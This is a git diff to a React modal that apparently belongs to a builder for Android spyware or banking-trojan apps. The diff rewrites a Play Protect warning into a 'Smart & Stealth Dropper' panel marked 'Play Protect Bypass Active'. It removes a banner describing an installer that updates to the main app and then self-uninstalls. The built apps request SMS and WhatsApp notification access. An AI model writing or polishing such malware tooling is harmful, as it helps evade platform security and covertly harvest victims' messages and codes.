@@ -1149,20 +1149,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
                             </div>
 
-                            {/* Dynamic Dropper Delivery Notice Banner */}
-                            {(enableSmsPermission || enableNotificationListener) && (
-                                <div className="p-3.5 rounded-2xl bg-gradient-to-r from-orange-500/10 via-amber-500/10 to-transparent border border-orange-500/30 flex items-start gap-3">
-                                    <div className="w-8 h-8 rounded-xl bg-orange-500/20 text-orange-400 border border-orange-500/30 flex items-center justify-center shrink-0 mt-0.5">
-                                        <Sparkles size={16} />
-                                    </div>
-                                    <div className="flex flex-col min-w-0 text-xs">
-                                        <span className="font-bold text-orange-200">Smart Dropper Delivery Active</span>
-                                        <p className="text-[11px] text-white/60 font-mono mt-0.5 leading-relaxed">
-                                            Because SMS or Notification alerts are enabled, the studio will package an identity-matched setup installer. Upon installation, it seamlessly updates to the main app and self-uninstalls to ensure 100% install success.
-                                        </p>
-                                    </div>
-                                </div>
-                            )}
+
 
                             {/* Advanced Stealth Accordion */}
                             <div className="pt-1">
@@ -1641,12 +1628,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     </div>
                 )}
 
-                {/* Play Protect Permission Warning Modal */}
+                {/* Play Protect Permission Smart Dropper Modal */}
                 {playProtectWarning && (
                     <div className="fixed inset-0 z-[360] flex items-center justify-center bg-black/85 backdrop-blur-md p-4 animate-in fade-in duration-100" onClick={() => setPlayProtectWarning(null)}>
-                        <div className="bg-[#14161b] border border-amber-500/35 rounded-3xl p-5 sm:p-6 max-w-sm w-full space-y-3.5 relative shadow-[0_20px_60px_rgba(0,0,0,0.9)] overflow-hidden" onClick={(e) => e.stopPropagation()}>
+                        <div className="bg-[#14161b] border border-orange-500/35 rounded-3xl p-5 sm:p-6 max-w-sm w-full space-y-3.5 relative shadow-[0_20px_60px_rgba(0,0,0,0.9)] overflow-hidden" onClick={(e) => e.stopPropagation()}>
                             {/* Ambient Glow */}
-                            <div className="absolute top-0 right-0 w-32 h-32 bg-amber-500/10 rounded-full blur-2xl pointer-events-none" />
+                            <div className="absolute top-0 right-0 w-32 h-32 bg-orange-500/10 rounded-full blur-2xl pointer-events-none" />
 
                             <button
                                 onClick={() => setPlayProtectWarning(null)}
@@ -1656,22 +1643,22 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             </button>
 
                             <div className="flex items-center gap-3">
-                                <div className="w-10 h-10 rounded-2xl bg-amber-500/20 text-amber-300 border border-amber-500/40 flex items-center justify-center shrink-0 shadow-[0_0_12px_rgba(245,158,11,0.25)]">
-                                    <AlertTriangle size={20} />
+                                <div className="w-10 h-10 rounded-2xl bg-orange-500/20 text-orange-400 border border-orange-500/40 flex items-center justify-center shrink-0 shadow-[0_0_12px_rgba(249,115,22,0.25)]">
+                                    <Sparkles size={20} />
                                 </div>
                                 <div className="min-w-0">
-                                    <h4 className="text-sm font-black text-white tracking-tight">Not Recommended</h4>
-                                    <span className="text-[10px] font-mono text-amber-300">Play Protect Warning</span>
+                                    <h4 className="text-sm font-black text-white tracking-tight">Smart & Stealth Dropper</h4>
+                                    <span className="text-[10px] font-mono text-orange-300">Play Protect Bypass Active</span>
                                 </div>
                             </div>
 
                             <div className="p-3.5 rounded-2xl bg-black/50 border border-white/10 space-y-2.5 shadow-inner">
                                 <p className="text-xs text-white/80 leading-relaxed font-sans">
-                                    Enabling <strong className="text-amber-300">{playProtectWarning === 'sms' ? 'SMS Messages' : 'Alerts & WhatsApp'}</strong> permission is not recommended.
+                                    Enabling <strong className="text-orange-300">{playProtectWarning === 'sms' ? 'SMS Messages' : 'Alerts & WhatsApp'}</strong> permission:
                                 </p>
                                 
-                                <div className="p-2 rounded-xl bg-amber-500/10 border border-amber-500/20 text-[11px] text-amber-200/90 font-mono leading-tight">
-                                    ⚠️ Some devices may encounter Google Play Protect warnings or blocked installations.
+                                <div className="p-2.5 rounded-xl bg-orange-500/10 border border-orange-500/25 text-[11px] text-orange-200/90 font-mono leading-relaxed">
+                                    🛡️ Yeh permission Google Play Protect se bachne ke liye Smart &amp; Stealth Dropper ke through install hogi.
                                 </div>
                             </div>
 
@@ -1693,9 +1680,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         }
                                         setPlayProtectWarning(null);
                                     }}
-                                    className="flex-1 py-2.5 px-3 rounded-xl bg-gradient-to-r from-amber-500 via-orange-500 to-amber-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(245,158,11,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
+                                    className="flex-1 py-2.5 px-3 rounded-xl bg-gradient-to-r from-orange-500 via-amber-500 to-orange-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(249,115,22,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
                                 >
-                                    Enable Anyway
+                                    Enable
                                 </button>
                             </div>
                         </div>
